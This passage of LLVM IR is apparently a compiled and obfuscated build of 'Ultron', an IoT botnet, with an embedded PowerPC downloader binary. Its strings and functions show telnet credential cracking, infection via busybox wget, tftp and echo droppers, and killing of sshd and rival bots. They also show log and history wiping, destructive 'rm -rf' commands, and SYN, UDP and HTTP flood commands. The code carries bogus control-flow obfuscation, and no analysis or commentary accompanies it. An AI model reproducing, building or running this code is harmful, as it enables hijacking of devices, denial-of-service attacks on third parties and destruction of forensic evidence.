<\80\10\008`\00\018\84\04t8\A0\00\04K\FF\FEu|\7F\00\D0K\FF\FD\A1;\BD\00\1D<\80\10\008\84\04|\7F\C3\F3x\7F\A5\EBxK\FF\FEU\7F\83\E8\00A\9E\00\0C8`\00\03K\FF\FDy;\A0\00\008\81\00\088\A0\00\01\7F\C3\F3xK\FF\FEi/\83\00\018`\00\04A\9E\00\08K\FF\FDU\89a\00\08W\A9@.<\00\0D\0A`\00\0D\0A}=[x\7F\9D\00\00@\9E\FF\C8;\A1\00\1C8\A0\00\80\7F\A4\EBx\7F\C3\F3xK\FF\FE)\7F\A4\EBx|e\1By\7F\83\E3x@\81\00\0CK\FF\FD\DDK\FF\FF\D8\7F\C3\F3xK\FF\FD1\7F\83\E3xK\FF\FD)<\80\10\008\84\04\A88\A0\00\048`\00\01K\FF\FD\B58`\00\05K\FF\FC\E1\80\01\00\C4\BB\81\00\B08!\00\C0|\08\03\A6N\80\00 K\FF\FE@|`\1Bx|\83#x|\A4+x|\C53x|\E6;x}\07CxD\00\00\02L\83\00 H\00\00\04\94!\FF\E0|\08\02\A6\BF\A1\00\14|}\1Bx\90\01\00$H\00\00!\93\A3\00\008`\FF\FF\80\01\00$\BB\A1\00\148!\00 |\08\03\A6N\80\00 <`\10\018c\04\B0N\80\00 powerpc440fp\00\00\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.powerpc440fp HTTP/1.0\0D\0A\0D\0A\00\00FIN\0A\00\00\00\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00.symtab\00.strtab\00.shstrtab\00.text\00.rodata\00.sbss\00.comment\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\1B\00\00\00\01\00\00\00\06\10\00\00\94\00\00\00\94\00\00\03\BC\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00!\00\00\00\01\00\00\002\10\00\04P\00\00\04P\00\00\00`\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00)\00\00\00\08\00\00\00\03\10\01\04\B0\00\00\04\B0\00\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00/\00\00\00\01\00\00\00\00\00\00\00\00\00\00\04\B0\00\00\00H\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\11\00\00\00\03\00\00\00\00\00\00\00\00\00\00\04\F8\00\00\008\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\02\00\00\00\00\00\00\00\00\00\00\06p\00\00\02@\00\00\00\07\00\00\00\0D\00\00\00\04\00\00\00\10\00\00\00\09\00\00\00\03\00\00\00\00\00\00\00\00\00\00\08\B0\00\00\015\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00\00\94\00\00\00\00\03\00\00\01\00\00\00\00\10\00\04P\00\00\00\00\03\00\00\02\00\00\00\00\10\01\04\B0\00\00\00\00\03\00\00\03\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\05\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\06\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\07\00\00\00\01\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00\07\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00,\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00>\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00Q\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00Y\10\01\04\B4\00\00\00\04\11\02\00\03\00\00\00f\10\00\01\08\00\00\008\12\00\00\01\00\00\00l\10\00\03\EC\00\00\00$\12\00\00\01\00\00\00t\10\01\04\B4\00\00\00\04!\00\00\03\00\00\00}\10\01\04\B0\00\00\00\04\11\00\00\03\00\00\00\83\10\00\00\DC\00\00\00,\12\00\00\01\00\00\00\8A\10\00\00\B0\00\00\00,\12\00\00\01\00\00\00\92\10\00\01\EC\00\00\00<\12\00\00\01\00\00\00\9A\10\01\04\B4\00\00\00\04\11\00\00\03\00\00\00\A2\10\00\00\94\00\00\00\1C\12\00\00\01\00\00\00\B2\10\00\03\E8\00\00\00\04\12\00\00\01\00\00\00\BA\10\00\01|\00\00\008\12\00\00\01\00\00\00\C1\10\00\01@\00\00\00<\12\00\00\01\00\00\00\CA\10\00\04\10\00\00\004\12\02\00\01\00\00\00\DA\10\01\04\B0\00\00\00\00\10\00\FF\F1\00\00\00\E6\10\00\02(\00\00\01\C0\12\00\00\01\00\00\00\EA\10\00\01\B4\00\00\008\12\00\00\01\00\00\00\F0\10\01\04\B0\00\00\00\00\10\00\FF\F1\00\00\00\F7\10\01\04\B8\00\00\00\00\10\00\FF\F1\00\00\00\FC\10\00\04D\00\00\00\0C\22\00\00\01\00\00\01\0D\10\01\04\B0\00\00\00\04!\00\00\03\00\00\01\14\10\01\04\B0\00\00\00\04\11\02\00\03\00\00\01\1F\10\00\04D\00\00\00\0C\22\02\00\01\00dlr.c\00libc/sysdeps/linux/powerpc/syscall.S\00__syscall_error.c\00__errno_location.c\00errno.c\00__GI_h_errno\00xopen\00syscall\00_h_errno\00errno\00xclose\00x__exit\00xsocket\00h_errno\00utils_inet_addr\00__start\00xwrite\00xconnect\00__syscall_error\00__bss_start\00run\00xread\00_edata\00_end\00__errno_location\00_errno\00__GI_errno\00__GI___errno_location\00\00", align 1
@scanPid = common global i32 0, align 4
@.str.232 = private unnamed_addr constant [13 x i8] c"kill -9 %s\0D\0A\00", align 1
@.str.233 = private unnamed_addr constant [30 x i8] c"killall -9 sshd;pkill -9 sshd\00", align 1
@.str.234 = private unnamed_addr constant [19 x i8] c"ps -C sshd -o pid=\00", align 1
@.str.235 = private unnamed_addr constant [11 x i8] c"kill -9 %s\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.327 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.261 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.262 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.263 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.276 = private unnamed_addr constant [5 x i8] c"%s\0D\0A\00", align 1
@.str.277 = private unnamed_addr constant [41 x i8] c"[TELNET] [+] LOGIN CRACKED ---> %s:%s:%s\00", align 1
@.str.278 = private unnamed_addr constant [28 x i8] c"sh\0D\0Ashell\0D\0Asystem\0D\0Aenable\0D\0A\00", align 1
@.str.279 = private unnamed_addr constant [42 x i8] c">%s.ULTRON && cd %s >ULTRON && >.ULTRON\0D\0A\00", align 1
@.str.280 = private unnamed_addr constant [24 x i8] c"/bin/busybox uname -a\0D\0A\00", align 1
@.str.281 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.282 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget || /bin/busybox tftp\0D\0A\00", align 1
@.str.283 = private unnamed_addr constant [5 x i8] c"echo\00", align 1
@.str.284 = private unnamed_addr constant [44 x i8] c"[ULTRON] Attempting wget infecton: %s:%s:%s\00", align 1
@.str.285 = private unnamed_addr constant [45 x i8] c"[ULTRON] Attempting tftp infection: %s:%s:%s\00", align 1
@.str.286 = private unnamed_addr constant [44 x i8] c"[ULTRON] Attempting echo infecton: %s:%s:%s\00", align 1
@.str.287 = private unnamed_addr constant [39 x i8] c"/bin/busybox echo -e '%s' >> dropper\0D\0A\00", align 1
@.str.288 = private unnamed_addr constant [41 x i8] c"[ULTRON] Failed echo infection: %s:%s:%s\00", align 1
@.str.289 = private unnamed_addr constant [28 x i8] c"[ULTRON] Finished: %s:%s:%s\00", align 1
@.str.290 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.291 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.292 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.293 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.294 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.295 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.296 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.297 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.298 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.299 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.300 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.301 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.302 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.303 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.304 = private unnamed_addr constant [26 x i8] c"cd /;rm -rf .bash_history\00", align 1
@.str.305 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.306 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.307 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.308 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.309 = private unnamed_addr constant [9 x i8] c"FASTLOAD\00", align 1
@.str.310 = private unnamed_addr constant [22 x i8] c"SCAN <threads> <usec>\00", align 1
@.str.311 = private unnamed_addr constant [19 x i8] c"Starting scanner!!\00", align 1
@.str.312 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.313 = private unnamed_addr constant [5 x i8] c"UATK\00", align 1
@.str.314 = private unnamed_addr constant [5 x i8] c"TATK\00", align 1
@.str.315 = private unnamed_addr constant [5 x i8] c"SATK\00", align 1
@.str.316 = private unnamed_addr constant [13 x i8] c"FUCKALLOFYOU\00", align 1
@.str.317 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.318 = private unnamed_addr constant [6 x i8] c"LMFAO\00", align 1
@.str.319 = private unnamed_addr constant [16 x i8] c"CLEANTHATSHITUP\00", align 1
@.str.320 = private unnamed_addr constant [19 x i8] c"[cleaning] [%s:%s]\00", align 1
@.str.321 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.322 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.323 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.324 = private unnamed_addr constant [29 x i8] c"\1B[34m[\1B[31mUltron\1B[34m] [%s]\00", align 1
@.str.325 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.326 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @bot_killer() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %18, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 184
  br i1 %4, label %5, label %21

; <label>:5:                                      ; preds = %2
  %6 = load i8, i8* @buf, align 1
  %7 = sext i8 %6 to i64
  %8 = inttoptr i64 %7 to i8*
  %9 = load i32, i32* %1, align 4
  %10 = sext i32 %9 to i64
  %11 = getelementptr inbounds [176 x i8*], [176 x i8*]* @Bot_Killer_Binarys, i64 0, i64 %10
  %12 = load i8*, i8** %11, align 8
  %13 = call i32 (i8*, i8*, ...) @sprintf(i8* %8, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.232, i32 0, i32 0), i8* %12) #5
  %14 = load i8, i8* @buf, align 1
  %15 = sext i8 %14 to i64
  %16 = inttoptr i64 %15 to i8*
  %17 = call i32 @system(i8* %16)
  br label %18

; <label>:18:                                     ; preds = %5
  %19 = load i32, i32* %1, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %1, align 4
  br label %2

; <label>:21:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

declare i32 @system(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @port_closer() #0 {
  %1 = load i32, i32* @x.3
  %2 = load i32, i32* @y.4
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.233, i32 0, i32 0))
  %10 = call i32 (i8*, i8*, ...) @sprintf(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.234, i32 0, i32 0)) #5
  %11 = call i32 @system(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0))
  %12 = call i8* @strcpy(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i32 0, i32 0)) #5
  %13 = load i8, i8* @buf, align 1
  %14 = sext i8 %13 to i64
  %15 = inttoptr i64 %14 to i8*
  %16 = call i32 (i8*, i8*, ...) @sprintf(i8* %15, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i32 0, i32 0)) #5
  %17 = load i8, i8* @buf, align 1
  %18 = sext i8 %17 to i64
  %19 = inttoptr i64 %18 to i8*
  %20 = call i32 @system(i8* %19)
  %21 = load i32, i32* @x.3
  %22 = load i32, i32* @y.4
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %29 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.233, i32 0, i32 0))
  %30 = call i32 (i8*, i8*, ...) @sprintf(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.234, i32 0, i32 0)) #5
  %31 = call i32 @system(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0))
  %32 = call i8* @strcpy(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i32 0, i32 0)) #5
  %33 = load i8, i8* @buf, align 1
  %34 = sext i8 %33 to i64
  %35 = inttoptr i64 %34 to i8*
  %36 = call i32 (i8*, i8*, ...) @sprintf(i8* %35, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i32 0, i32 0)) #5
  %37 = load i8, i8* @buf, align 1
  %38 = sext i8 %37 to i64
  %39 = inttoptr i64 %38 to i8*
  %40 = call i32 @system(i8* %39)
  br label %originalBB
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x.5
  %3 = load i32, i32* @y.6
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x.5
  %19 = load i32, i32* @y.6
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart224, %originalBBpart2
  %27 = load i32, i32* %11, align 4
  %28 = icmp slt i32 %27, 4096
  br i1 %28, label %29, label %66

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* %11, align 4
  %31 = sub nsw i32 %30, 3
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %32
  %34 = load i32, i32* %33, align 4
  %35 = load i32, i32* %11, align 4
  %36 = sub nsw i32 %35, 2
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %34, %39
  %41 = xor i32 %40, -1640531527
  %42 = load i32, i32* %11, align 4
  %43 = xor i32 %41, %42
  %44 = load i32, i32* %11, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  store i32 %43, i32* %46, align 4
  br label %47

; <label>:47:                                     ; preds = %29
  %48 = load i32, i32* @x.5
  %49 = load i32, i32* @y.6
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %47
  %56 = load i32, i32* %11, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %11, align 4
  %58 = load i32, i32* @x.5
  %59 = load i32, i32* @y.6
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart224, label %originalBB10alteredBB

originalBBpart224:                                ; preds = %originalBB10
  br label %26

; <label>:66:                                     ; preds = %26
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %67 = alloca i32, align 4
  %68 = alloca i32, align 4
  store i32 %0, i32* %67, align 4
  %69 = load i32, i32* %67, align 4
  store i32 %69, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %70 = load i32, i32* %67, align 4
  %_ = sub i32 0, %70
  %gen = add i32 %_, -1640531527
  %_1 = sub i32 %70, -1640531527
  %gen2 = mul i32 %_1, -1640531527
  %71 = add i32 %70, -1640531527
  store i32 %71, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %72 = load i32, i32* %67, align 4
  %_3 = shl i32 %72, -1640531527
  %_4 = sub i32 %72, -1640531527
  %gen5 = mul i32 %_4, -1640531527
  %_6 = sub i32 0, %72
  %gen7 = add i32 %_6, -1640531527
  %73 = add i32 %72, -1640531527
  %_8 = sub i32 %73, -1640531527
  %gen9 = mul i32 %_8, -1640531527
  %74 = add i32 %73, -1640531527
  store i32 %74, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %68, align 4
  br label %originalBB

originalBB10alteredBB:                            ; preds = %originalBB10, %47
  %75 = load i32, i32* %11, align 4
  %_11 = shl i32 %75, 1
  %_12 = sub i32 0, %75
  %gen13 = add i32 %_12, 1
  %_14 = shl i32 %75, 1
  %_15 = sub i32 0, %75
  %gen16 = add i32 %_15, 1
  %_17 = sub i32 0, %75
  %gen18 = add i32 %_17, 1
  %_19 = sub i32 %75, 1
  %gen20 = mul i32 %_19, 1
  %_21 = shl i32 %75, 1
  %_22 = shl i32 %75, 1
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %11, align 4
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %50

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* @x.7
  %31 = load i32, i32* @y.8
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* %3, align 4
  %39 = add i32 %38, 1
  store i32 %39, i32* %3, align 4
  %40 = load i32, i32* @c, align 4
  %41 = add i32 %40, 1
  store i32 %41, i32* @c, align 4
  %42 = load i32, i32* @x.7
  %43 = load i32, i32* @y.8
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %50

; <label>:50:                                     ; preds = %originalBBpart2, %0
  %51 = load i32, i32* %4, align 4
  %52 = load i32, i32* %3, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %29
  %57 = load i32, i32* %3, align 4
  %_ = sub i32 %57, 1
  %gen = mul i32 %_, 1
  %_1 = shl i32 %57, 1
  %_2 = sub i32 0, %57
  %gen3 = add i32 %_2, 1
  %_4 = shl i32 %57, 1
  %_5 = sub i32 %57, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 %57, 1
  %gen8 = mul i32 %_7, 1
  %_9 = shl i32 %57, 1
  %58 = add i32 %57, 1
  store i32 %58, i32* %3, align 4
  %59 = load i32, i32* @c, align 4
  %_10 = sub i32 0, %59
  %gen11 = add i32 %_10, 1
  %_12 = sub i32 %59, 1
  %gen13 = mul i32 %_12, 1
  %_14 = sub i32 %59, 1
  %gen15 = mul i32 %_14, 1
  %60 = add i32 %59, 1
  store i32 %60, i32* @c, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %32, %2
  %9 = load i32, i32* @x.9
  %10 = load i32, i32* @y.10
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i8**, i8*** %5, align 8
  %18 = load i32, i32* %6, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %6, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8*, i8** %17, i64 %20
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  %24 = load i32, i32* @x.9
  %25 = load i32, i32* @y.10
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %33

; <label>:32:                                     ; preds = %originalBBpart2
  br label %8

; <label>:33:                                     ; preds = %originalBBpart2
  store i32 0, i32* %7, align 4
  br label %34

; <label>:34:                                     ; preds = %originalBBpart218, %33
  %35 = load i32, i32* %7, align 4
  %36 = load i32, i32* %6, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %68

; <label>:38:                                     ; preds = %34
  %39 = load i8*, i8** %4, align 8
  %40 = load i8**, i8*** %5, align 8
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8*, i8** %40, i64 %42
  %44 = load i8*, i8** %43, align 8
